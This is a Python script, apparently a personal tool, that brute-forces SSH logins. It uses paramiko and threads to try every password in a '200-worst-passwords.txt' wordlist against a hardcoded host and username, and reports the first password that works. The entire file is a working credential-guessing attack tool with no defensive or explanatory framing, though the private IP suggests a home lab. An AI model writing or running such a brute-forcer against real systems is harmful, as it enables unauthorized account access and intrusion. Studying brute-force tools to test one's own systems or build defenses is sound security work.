
import os, sys, paramiko
from time import sleep
from termcolor import cprint

from threading import Thread, Event

error_file = open("brute-ssh.log", "w")
sys.stderr = error_file

def try_connect():
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=hostname,
            port=port,
            username=username,
            password="test",
            banner_timeout=0,
        )
    except paramiko.ssh_exception.NoValidConnectionsError:
        cprint("NoValidConnectionsError ( ssh server might be dead, please make sure ip and port and username is ok ), exiting...", "red")
        exit()
    except paramiko.ssh_exception.AuthenticationException:
        cprint("SSH Server looks ok, starting bruteforce now", "light_green")

    except paramiko.ssh_exception.SSHException:
        cprint("SSHException, exiting...", "red")
        exit()
    except:
        cprint("Error, exiting...", "red")
        exit()  

def ssh_connect(thread_count, password):
    global done
    global running
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for rep in range(100):
        try:
            if thread_event.is_set():
                return None
            ssh.connect(
                hostname=hostname,
                port=port,
                username=username,
                password=password
            )
            thread_event.set()
            cprint(f"\n[+] Password Found : {password}\n", "light_green", attrs=["underline", "bold"])
            cprint(f"[*] Number of Tries : {thread_count}", "blue")
            break
        except paramiko.ssh_exception.AuthenticationException:
            # print(f"running : {running}")
            if thread_event.is_set():
                break
            cprint(f"[{done}] Invalid Password : {password}", "red")
            done+=1
            break
        except paramiko.ssh_exception.SSHException:
            # cprint(f"[*] Retrying Password : {password}", "yellow")
            sleep(2)
            if rep == 99:
                done+=1
                break   
            continue

    ssh.close()
    running = running - 1
    if done == file_length:
        thread_event.set()
        cprint("[-] No Password Found", "red", attrs=["bold", "underline"])
    # cprint(f"IM DONE, RUNNING : {running}", "light_green")
    if running <= 7: # check how many running threads
        # cprint(f"Enable", "blue")
        thread_wait.set() # enable main program to spawn more threads
    # cprint("[*] Thread \"{thread_count}\" is done", "blue")

hostname = "192.168.18.65"
port = 22
username = "jaegerfaus"
thread = 10
passlist_filename = "200-worst-passwords.txt"
done = 0
file_length = 0
thread_count = 1
running = 0
thread_wait = Event()
with open(passlist_filename, "r") as passlist_file:
    file_length = len(passlist_file.readlines())

try_connect()


with open(passlist_filename, "r") as passlist_file:
    cprint(f"[*] Number of Passwords : {file_length}", "yellow")
    thread_event = Event()
    for password in passlist_file:
        if not password:
            continue
        if running >= 5:
            thread_wait.wait()
        password = password.replace("\n", "").replace("\t", "").replace(" ", "")
        if thread_event.is_set():
            exit()
        thread = Thread(target=ssh_connect, args=(thread_count, password,))
        thread.start()
        running += 1
        thread_count+=1
        sleep(0.1)

cprint("[*] Waiting for threads to finish", "yellow")
thread_event.wait()
    
cprint("[*] Main Program Exiting", "yellow")

error_file.close()